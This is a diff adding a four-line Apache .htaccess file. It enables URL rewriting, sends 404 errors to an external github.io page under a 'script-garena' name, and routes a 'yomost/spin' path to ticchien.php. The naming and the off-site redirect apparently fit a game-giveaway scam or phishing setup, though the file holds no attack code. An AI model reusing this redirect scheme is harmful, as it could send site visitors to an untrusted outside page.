@@ -1,0 +1,4 @@
+RewriteEngine On
+
+ErrorDocument 404 https://script-garena.github.io/d%E1%BB%8Behsjsk.html
+RewriteRule ^yomost/spin$ ticchien.php [L]
